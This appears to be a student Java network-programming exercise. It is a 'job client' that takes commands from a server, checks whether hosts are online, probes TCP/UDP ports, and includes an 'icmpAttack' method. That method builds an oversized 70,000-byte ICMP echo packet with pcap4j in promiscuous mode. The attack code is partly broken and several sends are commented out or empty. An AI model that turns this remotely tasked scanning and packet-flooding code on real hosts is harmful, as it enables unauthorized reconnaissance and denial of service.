import org.pcap4j.core.*;
import org.pcap4j.packet.*;
import org.pcap4j.packet.namednumber.*;
import org.pcap4j.util.MacAddress;

import java.io.*;
import java.net.*;

public class Jobclient2 {
   
    public static boolean unknownHost;

    public static InputStream ip;
    public static BufferedReader reader;
    public static OutputStream op;
    public static PrintWriter printwriter;

    public static Socket sock;

    public static String getHostname() {
        try {
            return InetAddress.getLocalHost().getHostName();
        } 
        catch(UnknownHostException e) {
            return "unknown";
        }
    }

    public static void getIOStreams() {
        try {
            ip = sock.getInputStream();
            op = sock.getOutputStream();
        } 
        catch (IOException ignored) { }

        reader = new BufferedReader(new InputStreamReader(ip));
        printwriter = new PrintWriter(op, true);
    }

    public static void closeIOStreams() {
        try {
            ip.close();
            op.close();
        } 
        catch (IOException ignored) { }
    }

    public static boolean setSocket(String hostName, int portNum) {
        try {
            sock = new Socket(hostName, portNum);
            return true;
        } 
        catch(IOException e) {
            return false;
        }
    }

    public static void closeSocket() {
        try {
            sock.close();
        } 
        catch(IOException ignored) { }
    }

    public static byte[] convertIP(String IPString) {
        
        String replacedString = IPString.replace('.', ',');
        String[] newIPString = replacedString.split(",");
        byte[] ipAddress = new byte[newIPString.length];
        
        for(int idx = 0; idx < newIPString.length; idx++) {
            ipAddress[idx] = (byte) Integer.parseInt(newIPString[idx]);
        }

        return ipAddress;
    }

    public static String getJob() {
        try {
            return reader.readLine();
        }
        catch(IOException e) {
            return "error";
        }
    }

    public static boolean work() {
        
        String job = getJob();

        if(job.compareTo("error") == 0)
            return false;

        String[] tokens = job.split(",");

        switch (Integer.parseInt(tokens[0])) {
            
            case 1:
                
                if(isOnline(Integer.parseInt(tokens[1]), tokens[2]))
                    printwriter.println(tokens[2] + " is online!");
                
                else {
                    if(unknownHost)
                        printwriter.println(tokens[2] + " is an unknown host!");
                    else
                        printwriter.println(tokens[2] + " is not online!");
                    unknownHost = false;
                }
                break;
            
            case 2:
                
                String output = TCPUDPOpenClose(Integer.parseInt(tokens[1]), tokens[2]);
                if(unknownHost)
                        printwriter.println(tokens[2] + " is an unknown host!");
                else
                    printwriter.println("The status of port " + tokens[1] + " at IP address " + tokens[2] + " is: " + output);
                unknownHost = false;
                break;

            case 3:
                
                icmpAttack(tokens[2]);
                printwriter.println("Attacked!");
                break;
            
            default:
                
                printwriter.println("Other job output ");
                break;
        }
        return true;
    }

    public static boolean isOnline(int mode, String user) {
        if(mode == 1) {
            try {
                return InetAddress.getByAddress(convertIP(user)).isReachable(2000);
            } 
            catch(UnknownHostException e) {
                unknownHost = true;
                return false;
            } 
            catch(IOException ignored) { }
        }

        else {
            try {
                return InetAddress.getByName(user).isReachable(2000); // Checking if Host Name is online
            } 
            catch(UnknownHostException e) {
                unknownHost = true;
                return false;
            } 
            catch(IOException ignored) { }
        }
        return false;
    }

    public static String TCPUDPOpenClose(int portNum, String ip) {
        
        String output = "closed";
        InetAddress ipAddress;
        
        try {
            ipAddress = InetAddress.getByAddress(convertIP(ip));
        } 
        catch (UnknownHostException e) {
            unknownHost = true;
            return "";
        }
        try {
            (new DatagramSocket(portNum, ipAddress)).close();
            output = "UDP open";
            (new Socket(ipAddress, portNum)).close();
            return "TCP and UDP both open";
        } 
        catch(IOException ignored) { }

        try {
            (new Socket(ipAddress, portNum)).close();
            output = "TCP open";
        } 
        catch(IOException ignored) { }

        return output;
    }

    public static void icmpAttack(String target) {
        PcapHandle handle;
        PcapNetworkInterface device;
        PcapStat stat;

        byte[] data = new byte[70000];
        for(int idx=0; idx< data.length; idx++){
            data[idx] = (byte) idx;
        }

        try{
            InetAddress targetAddress = InetAddress.getByName(target);
            InetAddress localhost = InetAddress.getLocalHost();
            NetworkInterface ni = NetworkInterface.getByInetAddress(targetAddress);
            NetworkInterface niLocal = NetworkInterface.getByInetAddress(localhost);

            byte[] mac = niLocal.getHardwareAddress();
            System.out.println("Garbage: "+mac.toString());
            MacAddress sourceMac = MacAddress.getByAddress(niLocal.getHardwareAddress());
            if(sourceMac != null)
                System.out.println("Source Mac Address is(in String format): "+sourceMac.toString());
            else
                System.out.println("Source Mac Address is NULL!");

            device = Pcaps.getDevByAddress(localhost);
            System.out.println(device);
            System.out.println("Local: "+niLocal.getDisplayName());

            System.out.println("Before Handler");
            handle = device.openLive(65570, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 60);
            stat = handle.getStats();
            
            System.out.println("Before Handler SendPacket");
            System.out.println("\nReceiving Packets\n");
            
            PacketListener packetlistener = new PacketListener() {
                @Override
                public void gotPacket(PcapPacket pcapPacket) {
                    System.out.println("Received packets: ");
                    System.out.println(pcapPacket.getTimestamp());
                    System.out.println(pcapPacket);
                }
            };

            IcmpV4EchoPacket.Builder echoPacket = new IcmpV4EchoPacket.Builder();
            echoPacket.identifier((short) 1);
            echoPacket.payloadBuilder(new UnknownPacket.Builder().rawData(data));

            IcmpV4CommonPacket.Builder echoIcmp = new IcmpV4CommonPacket.Builder();
            echoIcmp.type(IcmpV4Type.ECHO);
            echoIcmp.code(IcmpV4Code.NO_CODE);
            echoIcmp.payloadBuilder(echoPacket);
            echoIcmp.correctChecksumAtBuild(true);

            IpV4Packet.Builder ipV4Builder = new IpV4Packet.Builder();
            ipV4Builder.version(IpVersion.IPV4);
            ipV4Builder.tos(IpV4Rfc791Tos.newInstance((byte) 0));
            ipV4Builder.ttl((byte) 100);
            ipV4Builder.protocol(IpNumber.ICMPV4);
            ipV4Builder.srcAddr((Inet4Address) InetAddress.getLocalHost());
            ipV4Builder.dstAddr((Inet4Address) InetAddress.getByName(target));
            ipV4Builder.payloadBuilder(echoIcmp);
            ipV4Builder.correctChecksumAtBuild(true);
            
            for (Packet.Builder builder : ipV4Builder.correctLengthAtBuild(true)) {
                System.out.println("###########");
                System.out.println(" Echo request Packets being send");
                System.out.println("###########");
                //comment line below to execute on Windows
                //handle.sendPacket(data);
            }

            EthernetPacket.Builder ethernet = new EthernetPacket.Builder();
            ethernet.dstAddr(MacAddress.ETHER_BROADCAST_ADDRESS);
            ethernet.srcAddr(sourceMac);
            ethernet.type(EtherType.IPV4);
            ethernet.paddingAtBuild(true);

            Packet pack = ethernet.build();
            System.out.println("###########");
            System.out.println("Echo request Packets being send");
            System.out.println("###########");

            handle.sendPacket(pack);
            handle.loop(40, packetlistener);

            System.out.println(stat.getNumPacketsCaptured());
        }
        catch (Exception e){
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        
        int port = 4999;
        String hostName = getHostname();
        if(hostName.compareTo("unknown") == 0)
            hostName = "localhost";

        while(true) {
            if(!setSocket(hostName, port))
                break;
            getIOStreams();

            if(!work()) {
                printwriter.println("error");
                break;
            }

            closeIOStreams();
            closeSocket();
        }

        closeIOStreams();
        closeSocket();
    }
}